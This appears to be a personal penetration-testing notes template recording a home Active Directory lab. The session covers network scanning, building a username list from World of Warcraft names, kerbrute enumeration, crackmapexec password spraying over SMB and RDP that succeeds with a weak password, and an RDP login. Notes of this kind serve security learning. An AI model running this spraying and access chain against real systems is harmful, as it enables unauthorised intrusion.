---
created_date: 15 October 2023
updated_date: 15 October 2023
type: windows/linux/template
---
##### Machine Information
```
IP Address:
Hostname:
Operating System:
Exploit & Port:
Privilege Escalation:
Credentials:

Path to Box:

-> NIX01 - 192.168.1.1
--> NIX02 - 192.168.1.2
```
### High-Level Summary

A brief description of the attack chain with machine names, including the depth of compromise should be included here.

-------------
### Initial Scanning

- [ ] `Ping`
- [ ] `Rustscan`
- [ ] `Quick TCP Nmap`
- [ ] `Full TCP Nmap`
- [ ] `Full UDP Nmap`

#fping
- fping to pingsweep network to get quick idea of network
```bash
[root💀~] [192.168.146.129] [2023-10-15 20:23:52] 
 └─╼ # fping -angq 192.168.146.0/24
_gateway
gobots
192.168.146.132
192.168.146.134
192.168.146.135
```

#ping
- Pinging to ensure box is up, get brief OS information.
```bash
ping $ip_address
```

#rustscan 
- Typically way faster than nmap, gives very brief port information - but enough to get started while other nmap scripts run.
```bash
rustscan -a $ip_address
```

#quick #tcp #nmap 
- Quick Nmap to get initial port information.
```bash
nmap -sC -sV -Pn $ip_address
```

#full #tcp #nmap 
- Full TCP Nmap to get all port information.
```bash
nmap -sC -sV -p- -Pn $ip_address
```
##### Initial Scanning Notes:
#initial #scanning #notes
- NOTES
- NOTES
- NOTES

#cme #smb
```bash
[root💀~] [192.168.146.129] [2023-10-15 21:06:31] 
 └─╼ # crackmapexec smb 192.168.146.0/24
SMB         192.168.146.134 445    HORDE            [*] Windows 10.0 Build 19041 x64 (name:HORDE) (domain:BLIZZARD.local) (signing:False) (SMBv1:False)
SMB         192.168.146.132 445    WARCRAFT-DC      [*] Windows Server 2019 Standard Evaluation 17763 x64 (name:WARCRAFT-DC) (domain:BLIZZARD.local) (signing:True) (SMBv1:True)
SMB         192.168.146.135 445    ALLIANCE         [*] Windows 10.0 Build 19041 x64 (name:ALLIANCE) (domain:BLIZZARD.local) (signing:False) (SMBv1:False)
```
- see that the domain's theme is World of Warcraft, so looked up wow characters and made a list
```bash
[root💀~/SUT/personal_AD] [192.168.146.129] [2023-10-15 21:28:30] 
 └─╼ # cut -d "," -f 1 userlist.txt > wowuserlist.txt
 [root💀~/SUT/personal_AD] [192.168.146.129] [2023-10-15 21:28:56] 
 └─╼ # cat wowuserlist.txt 
Fenris
Yrel
Ner'zhul
Archmage Khadgar
Velen
Blackhand
Vindicator Maraad
Kilrogg Deadeye
Durotan
Grommash Hellscream
Kargath Bladefist
Vereesa Windrunner
Tyrande Whisperwind
Li Li Stormstout
Sunwalker Dezco
Rexxar
Gul'dan
Valeera Sanguinar
Malfurion Stormrage
Uther the Lightbringer
Shaohao
Taran Zhu
Varian Wrynn
Anduin Wrynn
Jaina Proudmoore
Garrosh Hellscream
Sylvanas Windrunner
Thrall
Vol'jin
Baine Bloodhoof
Lor'themar Theron
The Lich King
Illidan Stormrage
Deathwing
Lei Shen
Wrathion
Chen Stormstout
Moira Thaurissan
```
#kerbrute
- kerbrute to enumerate the usernames of the domain
- kerbrute can be used to bruteforce usernames and passwords.
- not working for me to find users.
```bash
[root💀~/SUT/personal_AD] [192.168.146.129] [2023-10-15 21:56:46] 
 └─╼ # /opt/kerbrute/kerbrute_linux_amd64 userenum -d blizzard.local --dc WARCRAFT-DC.BLIZZARD.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
#cme #smb 
```bash
[root💀~/SUT/personal_AD] [192.168.146.129] [2023-10-15 22:17:42] 
 └─╼ # crackmapexec smb 192.168.146.0/24 -u 'swindrunner' -p 'Password1'
SMB         192.168.146.135 445    ALLIANCE         [*] Windows 10.0 Build 19041 x64 (name:ALLIANCE) (domain:BLIZZARD.local) (signing:False) (SMBv1:False)
SMB         192.168.146.132 445    WARCRAFT-DC      [*] Windows Server 2019 Standard Evaluation 17763 x64 (name:WARCRAFT-DC) (domain:BLIZZARD.local) (signing:True) (SMBv1:True)
SMB         192.168.146.134 445    HORDE            [*] Windows 10.0 Build 19041 x64 (name:HORDE) (domain:BLIZZARD.local) (signing:False) (SMBv1:False)
SMB         192.168.146.135 445    ALLIANCE         [+] BLIZZARD.local\swindrunner:Password1 (Pwn3d!)
SMB         192.168.146.132 445    WARCRAFT-DC      [+] BLIZZARD.local\swindrunner:Password1 
SMB         192.168.146.134 445    HORDE            [+] BLIZZARD.local\swindrunner:Password1 (Pwn3d!)
[root💀~/SUT/personal_AD] [192.168.146.129] [2023-10-15 22:19:06] 
 └─╼ # /opt/kerbrute/kerbrute_linux_amd64 userenum --dc 192.168.146.34 -d BLIZZARD.local wowuserlist.txt
```
#cme #rdp
```bash
[root💀~/SUT/personal_AD] [192.168.146.129] [2023-10-15 22:19:58] 
 └─╼ # crackmapexec rdp 192.168.146.0/24 -u 'swindrunner' -p 'Password1'
RDP         192.168.146.134 3389   HORDE            [*] Windows 10 or Windows Server 2016 Build 19041 (name:HORDE) (domain:BLIZZARD.local) (nla:True)
RDP         192.168.146.132 3389   WARCRAFT-DC      [*] Windows 10 or Windows Server 2016 Build 17763 (name:WARCRAFT-DC) (domain:BLIZZARD.local) (nla:True)
RDP         192.168.146.135 3389   ALLIANCE         [*] Windows 10 or Windows Server 2016 Build 19041 (name:ALLIANCE) (domain:BLIZZARD.local) (nla:True)
RDP         192.168.146.134 3389   HORDE            [+] BLIZZARD.local\swindrunner:Password1 (Pwn3d!)
RDP         192.168.146.132 3389   WARCRAFT-DC      [+] BLIZZARD.local\swindrunner:Password1 
RDP         192.168.146.135 3389   ALLIANCE         [+] BLIZZARD.local\swindrunner:Password1 (Pwn3d!)
```
#xfreerdp
- able to authenticate with swindrunner  on 192.168.146.134
```bash
[root💀~/SUT/personal_AD] [192.168.146.129] [2023-10-15 22:20:59] 
 └─╼ # xfreerdp /u:swindrunner /p:Password1 /v:192.168.146.134
```


-------


